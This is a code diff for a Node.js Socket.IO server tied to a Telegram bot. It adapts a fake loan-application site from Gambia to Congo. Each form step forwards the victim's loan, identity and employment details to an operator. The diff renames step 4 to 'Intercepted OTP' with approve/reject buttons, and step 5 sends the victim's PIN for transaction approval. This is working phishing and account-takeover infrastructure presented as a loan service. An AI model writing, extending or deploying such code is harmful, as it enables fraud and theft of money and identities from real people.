@@ -18,7 +18,7 @@ const io = socketIo(server, {
     }
 });
 
-global.io = io; // Allow bot_manager to access the socket instance
+global.io = io; // Link socket globally so botManager can call back rooms
 
 const PORT = process.env.PORT || 3000;
 const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 
@@ -34,26 +34,26 @@ app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
 });
 
 io.on('connection', (socket) => {
-    // Generate a unique AppID for the Gambia session
-    const appId = `GMB-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
+    // Generate unique Congo application session tag
+    const appId = `COD-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
     
-    // Join the room so the bot can "call back" this specific user
     socket.join(appId);
+    console.log(`🔌 Congo User connected: ${appId}`);
     
-    console.log(`🔌 Gambia User connected: ${appId}`);
+    // Send AppID back to the frontend right away
     socket.emit('session-ready', { appId: appId });
 
-    // Step Handlers
-    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇬🇲 Step 1: Loan", data));
-    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇬🇲 Step 2: Identity", data));
-    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇬🇲 Step 3: Employment", data));
+    // Standard Log Streams (No admin inline interaction buttons needed)
+    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 1: Loan Request", data, false));
+    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 2: Identity Profile", data, false));
+    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 3: Employment Profile", data, false));
 
-    // Step 4: Login Credentials - Approval moves user directly to PIN step
+    // Step 4: OTP Entry Point (Triggers confirmation/rejection inline buttons)
     socket.on('step4', (data) => {
-        botManager.sendToAdmin(appId, "🇬🇲 Step 4: Login Credentials", data, true);
+        botManager.sendToAdmin(appId, "🇨🇩 Step 4: Intercepted OTP", data, true);
     });
 
-    // Step 5: Final PIN Submission (Matches 5-step index.html)
+    // Step 5: Final PIN Submission (Triggers transaction inline buttons)
     socket.on('step5', (data) => {
         botManager.sendFinalApproval(appId, data.pin);
     });
@@ -64,18 +64,18 @@ io.on('connection', (socket) => {
 });
 
 server.listen(PORT, async () => {
-    console.log(`🚀 Gambia Loan Server running on port ${PORT}`);
+    console.log(`🚀 Congo Loan Server running on port ${PORT}`);
     
-    // Set Webhook using the Render External URL
+    // Auto-configure Webhooks on deployment platforms like Render
     if (EXTERNAL_URL) {
         const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
         try {
             await botManager.bot.setWebHook(webhookUrl);
             console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
         } catch (err) {
-            console.error('❌ Webhook Error:', err.message);
+            console.error('❌ Webhook Setup Failed:', err.message);
         }
     } else {
-        console.warn('⚠️ RENDER_EXTERNAL_URL not found in .env. Webhook not set.');
+        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside environment configs.');
     }
 });
